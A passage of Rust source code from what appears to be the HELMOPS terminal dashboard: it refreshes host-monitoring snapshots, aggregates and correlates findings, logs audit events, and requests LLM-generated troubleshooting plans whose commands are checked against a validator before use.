        if let Some(ref guard) = self.dashboard.overlap_guard {
            guard.store(true, Ordering::SeqCst);
        }
        let db_path = self.runtime.db_path.clone();
        let conn = rusqlite::Connection::open(&db_path)
            .with_context(|| format!("failed to open db at {}", db_path.display()))?;
        self.toast("Refreshing dashboard...");
        let prev = crate::load_previous_snapshot(&conn);
        let report = crate::run_monitor_cycle(MonitorProfile::Standard, None, prev).await;
        let findings_json = serde_json::to_string(&report.findings).unwrap_or_default();
        crate::persist_monitor_snapshot(&conn, &report.snapshot, &findings_json);
        self.refresh_dashboard();
        self.toast(format!(
            "Dashboard refreshed: {} finding(s) on {}",
            report.findings.len(),
            report.snapshot.host.hostname
        ));
        self.dashboard.data.last_tick_instant = Some(Instant::now());
        self.dashboard.data.tick_count += 1;
        self.dashboard.data.ticks_skipped = 0;
        self.dashboard.data.consecutive_skips = 0;
        // Write audit event for the collector run before clearing the overlap guard.
        let domain_count = SnapshotDomains::domain_names().len();
        self.write_dashboard_event(
            "collector-run",
            Capability::FsRead.as_str(),
            &format!(
                "domains:{} findings:{}",
                domain_count,
                report.findings.len()
            ),
            &helm_memory::stable_hash_hex(&report.snapshot.id),
            &helm_memory::stable_hash_hex(&report.findings.len().to_string()),
        )?;
        // Clear overlap guard after the live refresh completes
        if let Some(ref guard) = self.dashboard.overlap_guard {
            guard.store(false, Ordering::SeqCst);
        }
        Ok(())
    }

    fn dashboard_issue_chat_task(&self, user_question: &str) -> String {
        let host = if self.dashboard.data.hostname.is_empty() {
            "localhost"
        } else {
            self.dashboard.data.hostname.as_str()
        };
        if let Some(finding) = self.current_dashboard_finding() {
            let checks = if finding.read_only_checks.is_empty() {
                "(no predefined read-only checks)".to_owned()
            } else {
                finding
                    .read_only_checks
                    .iter()
                    .map(|check| format!("- {check}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            let evidence = if finding.evidence_text.trim().is_empty() {
                "(no evidence captured yet)".to_owned()
            } else {
                finding.evidence_text.clone()
            };
            let fix_plan = finding
                .fix_plan
                .clone()
                .unwrap_or_else(|| "(no fix plan generated yet)".to_owned());
            format!(
                "You are assisting inside HELMOPS on host {host}.\n\
                 The operator is investigating one specific issue. Stay read-only unless they later open an apply flow.\n\
                 Base your answer on the stored finding context first. If more information is needed, suggest explicit read-only checks.\n\n\
                 Finding ID: {id}\n\
                 Kind: {kind}\n\
                 Severity: {severity}\n\
                 Status: {status}\n\
                 Title: {title}\n\
                 Impact: {impact}\n\
                 Risk: {risk}\n\
                 Sample: {sample}\n\
                 Evidence sources: {sources}\n\n\
                 Evidence already collected:\n{evidence}\n\n\
                 Read-only checks already available:\n{checks}\n\n\
                 Current fix draft:\n{fix_plan}\n\n\
                 Operator question:\n{user_question}\n\n\
                 Reply in four sections:\n\
                 1. Most likely explanation on this host\n\
                 2. Evidence that supports it\n\
                 3. Next read-only check, if any\n\
                 4. Safest likely fix with risk notes",
                id = finding.id,
                kind = finding.kind,
                severity = finding.severity,
                status = finding.status.label(),
                title = finding.title,
                impact = finding.impact,
                risk = finding.risk,
                sample = finding.sample,
                sources = if finding.evidence_sources.is_empty() {
                    "(none)".to_owned()
                } else {
                    finding.evidence_sources.join(", ")
                },
            )
        } else {
            format!(
                "You are assisting inside HELMOPS on host {host}. Stay read-only unless the operator later opens an apply flow.\n\nOperator question:\n{user_question}"
            )
        }
    }

    async fn generate_dashboard_plan(&mut self) -> Result<()> {
        if !self.is_llm_provider_configured() {
            self.toast(
                "No LLM provider configured. Run `helmops init --provider ollama` to enable AI-powered troubleshooting.",
            );
            return Ok(());
        }
        let Some(idx) = self.dashboard_selected_finding_index() else {
            self.toast("Select a finding first");
            return Ok(());
        };
        let Some(summary) = self.dashboard.data.findings.get(idx).cloned() else {
            self.toast("Finding not found");
            return Ok(());
        };
        let db_path = self.runtime.db_path.clone();
        let conn = rusqlite::Connection::open(&db_path)
            .with_context(|| format!("failed to open db at {}", db_path.display()))?;
        let Some(finding) = crate::find_finding_by_id(&conn, &summary.id) else {
            self.push_chat(
                MessageRole::Error,
                format!("[dashboard] finding `{}` is no longer stored.", summary.id),
            );
            return Ok(());
        };

        // Build the LLM prompt from the finding.
        let summary_fields = FindingSummaryFields::from(&finding);
        let prompt = build_narrative_prompt(&summary_fields);

        let plan_id = format!("plan-{}", uuid::Uuid::new_v4());
        let started_at = Utc::now().timestamp();

        // Set the plan to Loading and switch the detail pane.
        self.dashboard.active_plan = Some(DashboardPlan {
            finding_id: finding.id.clone(),
            plan_id: plan_id.clone(),
            status: PlanStatus::Loading { started_at },
            read_only_steps: summary.read_only_checks.len(),
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        self.dashboard.view = DashboardView::TroubleshootPlan(idx);
        self.dashboard.detail_scroll = 0;
        self.dashboard.pinned_incident = Some(PinnedIncidentState {
            fingerprint: summary.fingerprint.clone(),
            active_plan_id: Some(plan_id.clone()),
        });

        // Persist a baseline TroubleshootingPlan record so the plan_id is durable.
        let source = format!("finding:{}", finding.id);
        let _ = TroubleshootingPlanStore::insert(
            &conn,
            &plan_id,
            &source,
            &finding.snapshot_id,
            "[]",
            "[]",
            "[]",
            false,
            &prompt,
        );
        self.persist_dashboard_plan_status(
            &conn,
            &summary,
            &plan_id,
            &PlanStatus::Loading { started_at },
        );

        // Clone what the spawned task needs.
        let active_settings = self.active_settings.clone();
        let secrets = self.runtime.secrets.clone();
        let finding_id = finding.id.clone();
        let snapshot_id = finding.snapshot_id.clone();

        let (tx, rx) = tokio::sync::oneshot::channel::<PlanStatus>();

        tokio::spawn(async move {
            let status = Self::call_llm_for_plan(
                active_settings,
                secrets,
                prompt,
                plan_id,
                finding_id,
                snapshot_id,
            )
            .await;
            let _ = tx.send(status);
        });

        self.dashboard.pending_plan_rx = Some(rx);
        Ok(())
    }

    /// Performs the actual LLM chat call for a dashboard plan.
    /// This runs inside a `tokio::spawn` task to keep the UI responsive.
    async fn call_llm_for_plan(
        active_settings: ProviderSettings,
        secrets: SecretsStore,
        prompt: String,
        plan_id: String,
        finding_id: String,
        _snapshot_id: String,
    ) -> PlanStatus {
        use helm_core::ProviderError;

        // Build the provider.
        let (provider, model) = match build_provider(&active_settings, &secrets) {
            Ok(v) => v,
            Err(e) => {
                // If the error looks like auth, surface that.
                let msg = format!("{e}");
                if msg.contains("401") || msg.contains("403") || msg.contains("auth") {
                    return PlanStatus::AuthFailed;
                }
                return PlanStatus::MalformedResponse;
            }
        };

        let request = ChatRequest {
            model,
            system: None,
            messages: vec![helm_core::Message::user(&prompt)],
            tools: vec![],
            max_tokens: 4096,
            temperature: 0.4,
        };

        let chat_result =
            tokio::time::timeout(std::time::Duration::from_secs(30), provider.chat(request)).await;

        let response = match chat_result {
            Ok(Ok(resp)) => resp,
            Ok(Err(e)) => match &e {
                ProviderError::Timeout => return PlanStatus::Timeout,
                ProviderError::HttpStatus { status, .. } => {
                    if *status == 401 || *status == 403 {
                        return PlanStatus::AuthFailed;
                    }
                    if *status == 429 {
                        return PlanStatus::RateLimited {
                            retry_after_secs: 30,
                        };
                    }
                    return PlanStatus::MalformedResponse;
                }
                _ => return PlanStatus::MalformedResponse,
            },
            Err(_elapsed) => return PlanStatus::Timeout,
        };

        // Extract text from the response content blocks.
        let text = response
            .content
            .iter()
            .filter_map(|block| match block {
                helm_core::ContentBlock::Text(t) => Some(t.as_str()),
                _ => None,
            })
            .collect::<Vec<_>>()
            .join("\n");

        if text.trim().is_empty() {
            return PlanStatus::MalformedResponse;
        }

        // Parse the LLM output.
        let fix_plan = match parse_llm_response(&text) {
            Ok(fp) => fp,
            Err(e) => {
                tracing::debug!("LLM plan parse error for {plan_id}: {e}");
                return PlanStatus::MalformedResponse;
            }
        };

        // Validate each command through the blocklist and PATH check.
        let mut validated_steps: Vec<ValidatedFixStep> = Vec::new();
        for step in &fix_plan.steps {
            match CommandValidator::validate_command(&step.command) {
                Ok(()) => {
                    let binary_warnings: Vec<String> =
                        CommandValidator::check_all_binaries(&step.command)
                            .into_iter()
                            .map(|w| w.warning)
                            .collect();
                    validated_steps.push(ValidatedFixStep {
                        command: step.command.clone(),
                        purpose: step.purpose.clone(),
                        risk: step.risk.as_str().to_string(),
                        rollback: step.rollback.clone(),
                        binary_warnings,
                    });
                }
                Err(patterns) => {
                    let joined = patterns.join(", ");
                    tracing::warn!("plan-blocked finding={finding_id} pattern={:?}", patterns);
                    return PlanStatus::DangerousCommand {
                        pattern: joined,
                        command_text: step.command.clone(),
                    };
                }
            }
        }

        if validated_steps.is_empty() {
            return PlanStatus::MalformedResponse;
        }

        PlanStatus::Ready {
            narrative: fix_plan.narrative.text,
            fix_steps: validated_steps,
        }
    }

    async fn apply_dashboard_plan(&mut self) -> Result<()> {
        let Some(idx) = self.dashboard_selected_finding_index() else {
            self.toast("Select a finding first");
            return Ok(());
        };
        let Some(summary) = self.dashboard.data.findings.get(idx).cloned() else {
            self.toast("Finding not found");
            return Ok(());
        };
        let db_path = self.runtime.db_path.clone();
        let conn = rusqlite::Connection::open(&db_path)
            .with_context(|| format!("failed to open db at {}", db_path.display()))?;
        let plan_id = match &self.dashboard.active_plan {
            Some(plan) if plan.finding_id == summary.id => plan.plan_id.clone(),
            _ => {
                self.restore_active_dashboard_plan(&conn, &summary.id, None);
                match &self.dashboard.active_plan {
                    Some(plan) if plan.finding_id == summary.id => plan.plan_id.clone(),
                    _ => {
                        self.generate_dashboard_plan().await?;
                        match &self.dashboard.active_plan {
                            Some(plan) if plan.finding_id == summary.id => plan.plan_id.clone(),
                            _ => {
                                self.toast("Could not prepare plan");
                                return Ok(());
                            }
                        }
                    }
                }
            }
        };
        self.execute_apply_plan_inline(&plan_id);
        Ok(())
    }

    async fn run_dashboard_follow_up(&mut self, tx: mpsc::UnboundedSender<UiEvent>) -> Result<()> {
        let Some(idx) = self.dashboard_selected_finding_index() else {
            self.toast("Select a finding first");
            return Ok(());
        };
        let Some(summary) = self.dashboard.data.findings.get(idx) else {
            self.toast("Finding not found");
            return Ok(());
        };
        let Some(check) = summary.read_only_checks.first() else {
            self.toast("No read-only follow-up check for this finding");
            return Ok(());
        };
        let display = format!("[follow-up:{}] {}", summary.id, check);
        let agent_task = format!(
            "Run this exact read-only follow-up check once using diagnose-safe tools only. \
Do not modify the system. Then explain what the result means for finding {}.\n\nCommand:\n{}",
            summary.id, check
        );
        self.start_prepared_task_in_mode(display, agent_task, tx, AgentMode::Dashboard)
            .await
    }

    /// Reload dashboard data from the latest snapshot.
    fn refresh_dashboard(&mut self) {
        use helm_memory::SnapshotStore;

        let clear_dashboard = |dashboard: &mut DashboardState| {
            let old = std::mem::take(&mut dashboard.data);
            let fresh = DashboardData {
                cpu_history: old.cpu_history,
                mem_history: old.mem_history,
                load_history: old.load_history,
                disk_history: old.disk_history,
                ..DashboardData::default()
            };
            dashboard.data = fresh;
            dashboard.error = None;
        };

        // Capture selected fingerprint before rebuilding the finding list.
        let prev_fingerprint = self
            .workspace_fingerprint()
            .map(ToOwned::to_owned)
            .or_else(|| {
                self.dashboard_selected_finding_index()
                    .and_then(|idx| self.dashboard.data.findings.get(idx))
                    .map(|f| f.fingerprint.clone())
            });
        let prev_plan_id = self
            .dashboard
            .active_plan
            .as_ref()
            .map(|plan| plan.plan_id.clone());
        let prev_plan_finding_id = self
            .dashboard
            .active_plan
            .as_ref()
            .map(|plan| plan.finding_id.clone());

        let db_path = self.runtime.db_path.clone();
        let conn = match rusqlite::Connection::open(&db_path) {
            Ok(c) => c,
            Err(e) => {
                tracing::debug!(path = %db_path.display(), error = %e, "dashboard db unavailable");
                self.dashboard.selected_fingerprint = None;
                self.dashboard.pinned_incident = None;
                self.dashboard.active_plan = None;
                clear_dashboard(&mut self.dashboard);
                return;
            }
        };
        let record = match SnapshotStore::latest(&conn) {
            Ok(Some(r)) => r,
            Ok(None) => {
                self.dashboard.selected_fingerprint = None;
                self.dashboard.pinned_incident = None;
                self.dashboard.active_plan = None;
                clear_dashboard(&mut self.dashboard);
                return;
            }
            Err(e) => {
                self.dashboard.error = Some(format!("snapshot error: {e}"));
                return;
            }
        };
        let domains: SnapshotDomains =
            serde_json::from_str(&record.domains_json).unwrap_or_default();

        let hostname = record.host_hostname;
        let snapshot_id = record.id.clone();
        let load = &domains.load;
        let mem = &load.memory;
        let cpu_percent = if load.cpu_logical_count > 0 {
            ((load.load_average.one / load.cpu_logical_count as f64) * 100.0).clamp(0.0, 100.0)
        } else {
            0.0
        };
        let memory_used_pct = if mem.total > 0 {
            mem.used as f64 / mem.total as f64 * 100.0
        } else {
            0.0
        };
        let disk_entries: Vec<String> = domains
            .disks
            .filesystems
            .iter()
            .map(|fs| {
                let pct = if fs.total_bytes > 0 {
                    fs.used_bytes as f64 / fs.total_bytes as f64 * 100.0
                } else {
                    0.0
                };
                format!("{} {:.0}%", fs.mount_point, pct)
            })
            .collect();
        let mut disk_bars: Vec<(String, u8)> = domains
            .disks
            .filesystems
            .iter()
            .filter_map(|fs| {
                let pct = if fs.total_bytes > 0 {
                    (fs.used_bytes as f64 / fs.total_bytes as f64 * 100.0).round() as u8
                } else {
                    0
                };
                match fs.mount_point.as_str() {
                    "/" | "/home" | "/var" | "/var/log" => Some((fs.mount_point.clone(), pct)),
                    _ => None,
                }
            })
            .collect();
        disk_bars.sort_by(|left, right| {
            let rank = |mount: &str| match mount {
                "/" => 0,
                "/home" => 1,
                "/var/log" => 2,
                "/var" => 3,
                _ => 4,
            };
            rank(&left.0).cmp(&rank(&right.0))
        });
        let total_services = domains.services.units.len();
        let failed_services = domains.services.failed_units.len();
        let total_containers = domains.containers.containers.len();
        let running_containers = domains
            .containers
            .containers
            .iter()
            .filter(|c| c.status == "running")
            .count();
        let listening_ports = domains.ports.listeners.len();
        let last_log_errors = domains.logs.journal_errors_last_hour;
        let backup_count = domains.backups.tools_detected.len();

        #[derive(Debug, Clone)]
        struct AggregateFinding {
            latest: Finding,
            host: String,
            first_seen: i64,
            last_seen: i64,
            occurrence_count: usize,
            is_current: bool,
        }

        let latest_findings: Vec<Finding> =
            serde_json::from_str(&record.findings_json).unwrap_or_default();
        let finding_count = latest_findings.len();
        let finding_warnings = latest_findings
            .iter()
            .filter(|f| f.severity.as_str() == "warning")
            .count();

        let state_records = FindingStateStore::list(&conn).unwrap_or_default();
        let state_map: HashMap<String, FindingStateRecord> = state_records
            .into_iter()
            .map(|record| (record.fingerprint.clone(), record))
            .collect();
        let snapshot_records = SnapshotStore::list(&conn, 90).unwrap_or_default();
        let mut aggregates: HashMap<String, AggregateFinding> = HashMap::new();
        for snapshot in &snapshot_records {
            let findings: Vec<Finding> =
                serde_json::from_str(&snapshot.findings_json).unwrap_or_default();
            for finding in findings {
                let fingerprint = finding.fingerprint();
                let entry = aggregates
                    .entry(fingerprint)
                    .or_insert_with(|| AggregateFinding {
                        latest: finding.clone(),
                        host: snapshot.host_hostname.clone(),
                        first_seen: snapshot.collected_at,
                        last_seen: snapshot.collected_at,
                        occurrence_count: 0,
                        is_current: false,
                    });
                entry.occurrence_count += 1;
                if snapshot.collected_at < entry.first_seen {
                    entry.first_seen = snapshot.collected_at;
                }
                if snapshot.collected_at >= entry.last_seen {
                    entry.last_seen = snapshot.collected_at;
                    entry.latest = finding.clone();
                    entry.host = snapshot.host_hostname.clone();
                }
                if snapshot.id == record.id {
                    entry.is_current = true;
                }
            }
        }

        let mut metrics = DashboardMetrics::default();
        let mut kind_distribution: HashMap<String, u64> = HashMap::new();
        let mut age_distribution: HashMap<String, u64> = HashMap::new();
        let mut finding_summaries: Vec<FindingSummary> = Vec::with_capacity(aggregates.len());
        for (fingerprint, aggregate) in aggregates {
            let kind = infer_finding_kind(&aggregate.latest);
            let state_record = state_map.get(&fingerprint);
            let state = if aggregate.is_current {
                match state_record.map(|record| record.status) {
                    Some(FindingStateStatus::Suppressed) => DashboardFindingState::Suppressed,
                    Some(FindingStateStatus::Resolved) => DashboardFindingState::Resolved,
                    _ if aggregate.occurrence_count == 1
                        && age_bucket(aggregate.first_seen) == DashboardAgeFilter::UnderOneDay =>
                    {
                        DashboardFindingState::New
                    }
                    _ if aggregate.occurrence_count > 1 => DashboardFindingState::Recurring,
                    _ => DashboardFindingState::Open,
                }
            } else {
                match state_record.map(|record| record.status) {
                    Some(FindingStateStatus::Resolved) => DashboardFindingState::Resolved,
                    Some(FindingStateStatus::Suppressed) => DashboardFindingState::Suppressed,
                    _ => DashboardFindingState::SelfResolved,
                }
            };

            // Write audit events for auto-detected finding state transitions.
            if aggregate.is_current
                && matches!(
                    state,
                    DashboardFindingState::New | DashboardFindingState::Recurring
                )
            {
                let decision = match state {
                    DashboardFindingState::New => "new",
                    DashboardFindingState::Recurring => "recurring",
                    _ => unreachable!(),
                };
                let transition_key = format!("{}:{}", fingerprint, decision);
                if !self.audited_transitions.contains(&transition_key) {
                    if let Err(e) = self.write_dashboard_event(
                        "finding-state",
                        Capability::FsRead.as_str(),
                        decision,
                        &helm_memory::stable_hash_hex(&fingerprint),
                        &helm_memory::stable_hash_hex(&format!(
                            "{}:{}",
                            snapshot_id, aggregate.latest.id
                        )),
                    ) {
                        tracing::warn!(
                            fingerprint = %fingerprint,
                            decision = decision,
                            error = %e,
                            "failed to write auto-detection audit event"
                        );
                    }
                    self.audited_transitions.insert(transition_key);
                }
            }

            match state {
                DashboardFindingState::Open => metrics.open += 1,
                DashboardFindingState::New => {
                    metrics.open += 1;
                    metrics.new += 1;
                }
                DashboardFindingState::Recurring => {
                    metrics.open += 1;
                    metrics.recurring += 1;
                }
                DashboardFindingState::Suppressed => metrics.suppressed += 1,
                DashboardFindingState::Resolved => metrics.resolved += 1,
                DashboardFindingState::SelfResolved => metrics.self_resolved += 1,
            }
            match aggregate.latest.severity.as_str() {
                "critical" => metrics.critical += 1,
                "warning" => metrics.warning += 1,
                _ => {}
            }
            *kind_distribution.entry(kind.clone()).or_insert(0) += 1;
            *age_distribution
                .entry(age_bucket(aggregate.first_seen).label().to_owned())
                .or_insert(0) += 1;
            let sample = aggregate
                .latest
                .evidence
                .first()
                .map(|e| {
                    if e.value.trim().is_empty() {
                        e.note.clone()
                    } else {
                        e.value.clone()
                    }
                })
                .unwrap_or_else(|| aggregate.latest.title.clone());
            finding_summaries.push(FindingSummary {
                id: aggregate.latest.id.clone(),
                fingerprint,
                severity: aggregate.latest.severity.as_str().to_string(),
                confidence: aggregate.latest.confidence.as_str().to_string(),
                title: aggregate.latest.title.clone(),
                affected_resource: aggregate.latest.affected_resource.clone(),
                snapshot_id: aggregate.latest.snapshot_id.clone(),
                domain: aggregate.latest.category.as_str().to_string(),
                kind,
                host: aggregate.host,
                status: state,
                occurrence_count: aggregate.occurrence_count,
                first_seen: aggregate.first_seen,
                last_seen: aggregate.last_seen,
                age_label: format_relative_age(aggregate.first_seen),
                sample,
                state_note: state_record
                    .map(|record| {
                        if !record.suppression_reason.is_empty() {
                            record.suppression_reason.clone()
                        } else {
                            record.note.clone()
                        }
                    })
                    .unwrap_or_default(),
                evidence_text: aggregate
                    .latest
                    .evidence
                    .iter()
                    .map(|e| format!("{} = {} -- {}", e.source, e.value, e.note))
                    .collect::<Vec<_>>()
                    .join("\n"),
                evidence_sources: aggregate
                    .latest
                    .evidence
                    .iter()
                    .map(|e| e.source.clone())
                    .collect(),
                impact: aggregate.latest.impact.clone(),
                assumptions: aggregate.latest.assumptions.clone(),
                missing_data: aggregate.latest.missing_data.clone(),
                read_only_checks: aggregate.latest.read_only_checks.clone(),
                fix_plan: aggregate.latest.fix_plan.clone(),
                risk: match aggregate.latest.severity.as_str() {
                    "critical" => "high".to_owned(),
                    "warning" => "medium".to_owned(),
                    _ => "low".to_owned(),
                },
                rollback: aggregate
                    .latest
                    .fix_plan
                    .as_ref()
                    .map(|_| "review generated plan before apply".to_owned())
                    .unwrap_or_else(|| "read-only / not applicable".to_owned()),
                command_preview: aggregate.latest.read_only_checks.join("\n"),
                detector_id: aggregate.latest.detector_id.clone(),
                correlated_finding_ids: Vec::new(),
            });
        }

        // ── Correlation engine ──
        // For each finding, find other findings where domains match OR
        // affected_resource is a case-insensitive substring of the other's affected_resource.
        {
            let mut correlations: Vec<Vec<String>> = vec![Vec::new(); finding_summaries.len()];
            for (i, left) in finding_summaries.iter().enumerate() {
                for (j, right) in finding_summaries.iter().enumerate() {
                    if i == j {
                        continue;
                    }
                    let domain_match = left.domain == right.domain;
                    let resource_match = left
                        .affected_resource
                        .to_lowercase()
                        .contains(&right.affected_resource.to_lowercase())
                        || right
                            .affected_resource
                            .to_lowercase()
                            .contains(&left.affected_resource.to_lowercase());
                    if domain_match || resource_match {
                        correlations[i].push(right.id.clone());
                    }
                }
            }
            for (i, correlated) in correlations.into_iter().enumerate() {
                finding_summaries[i].correlated_finding_ids = correlated;
            }
        }

        finding_summaries.sort_by(|left, right| {
            let status_rank = |state: DashboardFindingState| match state {
                DashboardFindingState::New => 0,
                DashboardFindingState::Recurring => 1,
                DashboardFindingState::Open => 2,
                DashboardFindingState::Suppressed => 3,
                DashboardFindingState::Resolved => 4,
                DashboardFindingState::SelfResolved => 5,
            };
            let severity_rank = |severity: &str| match severity {
                "critical" => 0,
                "warning" => 1,
                _ => 2,
            };
            severity_rank(&left.severity)
                .cmp(&severity_rank(&right.severity))
                .then(status_rank(left.status).cmp(&status_rank(right.status)))
                .then(right.last_seen.cmp(&left.last_seen))
                .then(right.occurrence_count.cmp(&left.occurrence_count))
        });
        let collector_errors_raw =
            serde_json::from_str::<Vec<CollectorError>>(&record.collector_errors_json)
                .unwrap_or_default();
        let collector_errors: Vec<String> = collector_errors_raw
            .iter()
            .map(|e| format!("{}: {}", e.domain, e.message))
            .collect();
        let collector_health: Vec<(String, bool, Option<String>)> = SnapshotDomains::domain_names()
            .iter()
            .map(|&domain| {
                let err = collector_errors_raw.iter().find(|e| e.domain == domain);
                match err {
                    Some(e) => (domain.to_string(), false, Some(e.message.clone())),
                    None => (domain.to_string(), true, None),
                }
            })
            .collect();
        let plans = TroubleshootingPlanStore::list(&conn, 12).unwrap_or_default();
        let change_sets = ChangeSetStore::list(&conn, 12).unwrap_or_default();
        let audit_events = conn
            .prepare(
                "SELECT timestamp, capability, tool_name, decision
                 FROM audit_events
                 ORDER BY id DESC
                 LIMIT 12",
            )
            .ok()
            .and_then(|mut stmt| {
                stmt.query_map([], |row| {
                    let timestamp: i64 = row.get(0)?;
                    let time = chrono::DateTime::from_timestamp_millis(timestamp)
                        .map(|dt| dt.format("%H:%M:%S").to_string())
                        .unwrap_or_else(|| "--:--:--".to_owned());
                    let tool_name: String = row.get::<_, String>(2)?;
                    Ok(DashboardAuditRow {
                        time,
                        capability: row.get::<_, String>(1)?,
                        command: tool_name,
                        decision: row.get::<_, String>(3)?,
                    })
                })
                .ok()
                .map(|rows| rows.filter_map(Result::ok).collect::<Vec<_>>())
            })
            .unwrap_or_default();
        let collected_at = chrono::DateTime::from_timestamp(record.collected_at, 0)
            .map(|dt| dt.format("%H:%M:%S UTC").to_string())
            .unwrap_or_else(|| "unknown".into());
        let mut hosts = finding_summaries
            .iter()
            .map(|finding| finding.host.clone())
            .collect::<Vec<_>>();
        hosts.sort();
        hosts.dedup();
        let mut kinds = finding_summaries
            .iter()
            .map(|finding| finding.kind.clone())
            .collect::<Vec<_>>();
        kinds.sort();
        kinds.dedup();
        let mut kind_distribution = kind_distribution.into_iter().collect::<Vec<_>>();
        kind_distribution.sort_by(|left, right| right.1.cmp(&left.1).then(left.0.cmp(&right.0)));
        let mut age_distribution = age_distribution.into_iter().collect::<Vec<_>>();
        age_distribution.sort_by(|left, right| left.0.cmp(&right.0));

        // Push history before reassigning.
        let cap = self.dashboard.sparkline_history_depth;
        let push = |buf: &mut VecDeque<f64>, val: f64| {
            buf.push_back(val);
            if buf.len() > cap {
                buf.pop_front();
            }
        };
        push(&mut self.dashboard.data.cpu_history, cpu_percent);
        push(&mut self.dashboard.data.mem_history, memory_used_pct);
        push(&mut self.dashboard.data.load_history, load.load_average.one);
        let max_disk_pct = disk_bars
            .iter()
            .map(|(_, pct)| *pct as f64)
            .fold(0.0f64, f64::max);
        push(&mut self.dashboard.data.disk_history, max_disk_pct);

        self.dashboard.data = DashboardData {
            hostname,
            snapshot_id,
            profile: record.profile,
            cpu_percent,
            load_1m: load.load_average.one,
            load_5m: load.load_average.five,
            load_15m: load.load_average.fifteen,
            memory_used_pct,
            disk_entries,
            disk_bars,
            total_services,
            failed_services,
            total_containers,
            running_containers,
            listening_ports,
            last_log_errors,
            backup_count,
            finding_count,
            finding_warnings,
            findings: finding_summaries,
            hosts,
            kinds,
            metrics,
            kind_distribution,
            age_distribution,
            collected_at,
            collector_errors,
            collector_health,
            domains,
            plans,
            change_sets,
            audit_events,
            cpu_history: std::mem::take(&mut self.dashboard.data.cpu_history),
            mem_history: std::mem::take(&mut self.dashboard.data.mem_history),
            load_history: std::mem::take(&mut self.dashboard.data.load_history),
            disk_history: std::mem::take(&mut self.dashboard.data.disk_history),
            ..Default::default()
        };
        // Restore previous fingerprint if it still exists in the new findings list.
        if let Some(ref fp) = prev_fingerprint {
            if self
                .dashboard
                .data
                .findings
                .iter()
                .any(|f| &f.fingerprint == fp)
            {
                self.dashboard.selected_fingerprint = Some(fp.clone());
            }
        }
        self.clamp_dashboard_selection();
        if !matches!(self.dashboard.view, DashboardView::Overview) {
            self.persist_pinned_incident_from_current();
        }
        match (prev_plan_finding_id.as_deref(), prev_plan_id.as_deref()) {
            (Some(finding_id), preferred_plan_id) => {
                self.restore_active_dashboard_plan(&conn, finding_id, preferred_plan_id);
            }
            (None, _) => {
                if let Some(finding) = self.current_dashboard_finding().cloned() {
                    self.restore_active_dashboard_plan(&conn, &finding.id, None);
                } else {
                    self.dashboard.active_plan = None;
                }
            }
        }
        self.dashboard.error = None;
    }

    fn open_cost_meter(&mut self) {
        let memory = Arc::clone(&self.runtime.memory);
        let (tokens_in, tokens_out) = tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async move {
                let recents = memory.recent_episodes(20).await.unwrap_or_default();
                (
                    recents.iter().map(|e| e.tokens_in as u64).sum::<u64>(),
                    recents.iter().map(|e| e.tokens_out as u64).sum::<u64>(),
                )
            })
        });
        // Very rough USD estimate using $5 per 1M in, $15 per 1M out (Anthropic mid-tier baseline).
        let cost_usd =
            (tokens_in as f64 / 1_000_000.0) * 5.0 + (tokens_out as f64 / 1_000_000.0) * 15.0;
        self.modal = Some(ModalState::CostMeter {
            session_tokens_in: tokens_in,
            session_tokens_out: tokens_out,
            session_cost_usd: cost_usd,
        });
    }

    fn apply_remote_target(&mut self, args: &str) {
        let target = args.trim();
        if target.is_empty() {
            self.push_chat(MessageRole::System, self.remote_hint());
            return;
        }
        if matches!(target, "off" | "none" | "local") {
            self.active_remote = None;
            self.push_chat(
                MessageRole::System,
                "Remote target cleared. HELM will run locally.",
            );
            return;
        }
        let registry = match RemoteRegistry::load() {
            Ok(registry) => registry,
            Err(error) => {
                self.push_chat(
                    MessageRole::Error,
                    format!("Failed to load remote registry: {error}"),
                );
                return;
            }
        };
        if registry.get(target).is_none() {
            self.push_chat(
                MessageRole::Error,
                format!("Unknown remote target `{target}`. Use `helm remote list` to inspect registered targets."),
            );
            return;
        }
        self.active_remote = Some(target.to_owned());
        self.push_chat(
            MessageRole::System,
            format!("Remote target set to `{target}`. New tasks will run against that host."),
        );
    }

    fn render(&self, frame: &mut Frame<'_>) {
        render_app(self, frame.area(), frame.buffer_mut());
    }
}

fn spawn_input_thread(tx: mpsc::UnboundedSender<UiEvent>) {
    std::thread::spawn(move || {
        while let Ok(event) = event::read() {
            if tx.send(UiEvent::Input(event)).is_err() {
                break;
            }
        }
    });
}

fn spawn_tick_task(tx: mpsc::UnboundedSender<UiEvent>) {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_millis(180));
        loop {
            interval.tick().await;
            if tx.send(UiEvent::Tick).is_err() {
                break;
            }
        }
    });
}

fn spawn_dashboard_refresh_task(
    tx: mpsc::UnboundedSender<UiEvent>,
    overlap_guard: Arc<AtomicBool>,
) {
    let tx2 = tx.clone();
    let tx3 = tx.clone();
    // Lightweight dashboard re-read every 5s (reads latest snapshot from DB)
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            if tx.send(UiEvent::DashboardRefresh).is_err() {
                break;
            }
        }
    });
    // Full monitor cycle every 60s (collect + detect + persist)
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(60));
        let mut _local_consecutive_skips: u64 = 0;
        loop {
            interval.tick().await;
            if overlap_guard.load(Ordering::SeqCst) {
                _local_consecutive_skips += 1;
                if tx2.send(UiEvent::TickSkipped).is_err() {
                    break;
                }
            } else {
                _local_consecutive_skips = 0;
                if tx2.send(UiEvent::DashboardLiveRefresh).is_err() {
                    break;
                }
            }
        }
    });
    // Drop tx3 — held only to keep channel alive while tasks run
    let _ = tx3;
}

fn render_app(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    if area.width < 20 || area.height < 8 {
        Paragraph::new("HELM needs a larger terminal")
            .block(Block::default().borders(Borders::ALL).title("HELM"))
            .render(area, buf);
        return;
    }

    Block::default()
        .style(Style::default().bg(APP_BG).fg(APP_FG))
        .render(area, buf);

    if app.mode == AgentMode::Dashboard {
        let show_input = !app.input.text.is_empty();
        let constraints = if show_input {
            vec![
                Constraint::Min(10),
                Constraint::Length(input_height(&app.input.text, area.width)),
                Constraint::Length(2),
            ]
        } else {
            vec![Constraint::Min(10), Constraint::Length(2)]
        };
        let vertical = Layout::default()
            .direction(Direction::Vertical)
            .constraints(constraints)
            .split(area);
        render_dashboard(app, vertical[0], buf);
        if show_input {
